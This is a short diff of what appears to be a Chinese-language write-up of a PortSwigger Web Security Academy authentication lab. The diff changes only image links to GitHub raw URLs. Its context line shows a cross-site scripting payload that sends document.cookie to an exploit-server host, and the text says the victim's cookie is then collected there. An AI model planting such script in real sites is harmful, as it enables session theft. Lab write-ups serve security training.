@@ -24,13 +24,13 @@ document.location='//your-exploit-server-id.web-security-academy.net/'+document.
 
 3. 提交评论之后，在利用服务器获取到用户cookie
 
-![](images/37686424729E4782A555E5CDBC7423B7clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/37686424729E4782A555E5CDBC7423B7clipboard.png)
 
 
 
-![](images/AE524586DF254AE08709A8C587FCD195clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/AE524586DF254AE08709A8C587FCD195clipboard.png)
 
 
 
-![](images/D69E452D8915426E867EB5EA2BD5E729clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/D69E452D8915426E867EB5EA2BD5E729clipboard.png)
 
